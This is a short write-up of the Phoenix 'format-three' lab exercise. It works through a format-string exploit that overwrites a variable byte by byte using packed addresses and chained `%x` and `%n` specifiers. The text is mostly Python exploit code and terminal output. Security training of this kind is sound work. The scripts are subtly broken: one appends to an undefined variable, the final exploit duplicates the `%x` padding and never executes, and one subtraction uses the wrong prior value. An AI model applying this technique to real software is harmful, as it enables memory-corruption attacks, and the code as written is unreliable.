<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Format Three:
The offset is 11 to the the begining of `buffer`.We will overwrite `changeme` byte by byte.Let get the address of `changeme` variable.

```bash
root@phoenix-amd64:/opt/phoenix/i486# objdump -x format-three | grep changeme
08049844 g     O .bss	00000004 changeme
```
First write is at `0x08049844`.
```python
import struct
import os
string = ''
string += struct.pack('I',0x08049844 )
string += struct.pack('I',0x08049845 )
string += struct.pack('I',0x08049846 )
string += struct.pack('I',0x08049847 )
strings += "%x."  * 11 
strings += '%n'
os.system("echo " + string + " | ./format-three ")
```
Lets see if 49 will be stored at `0x08049844`:
```bash
root@phoenix-amd64:/opt/phoenix/i486# python exploit.py 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DFGH0.0.0.f7f81cf7.f7ffb000.ffffd638.8048556.ffffc630.ffffc630.fff.0.
Better luck next time - got 0x00000051, wanted 0x64457845!
```
To change 51 to 45 will need a higher number like 145 `145 - 51 = F4 --> 244` 
```python
string += "%x."  * 11
string += 'A' * 244 
string += '%n'
os.system("echo " + string + " | ./format-three ")
```
Run the program.
```bash
root@phoenix-amd64:/opt/phoenix/i486# python exploit.py 
------
Better luck next time - got 0x00000145, wanted 0x64457845!

```
- Now 145 bytes are stored at this address in next addres we need to write 78. `178 - 145 = 33 --> 51`.
- Then We need to write `45`. `245 - 178 = CD --> 205`.
- Finaly. we need 64.`264 - 205 = 1F --> 31`


### Exploit : 
```python
import struct
import os
string= ''
string += struct.pack('I', 0x08049844)
string += struct.pack('I', 0x08049845)
string += struct.pack('I', 0x08049846)
string += struct.pack('I', 0x08049847)
print(len(string))
string += '%x.' * 11
print(len(string))
string += '%x.' * 11 + 'A' * 244 +  '%n'
string += 'A' * 51 + '%n'
string += 'A' * 205 + '%n'
string += 'A' * 31 + '%n'
```

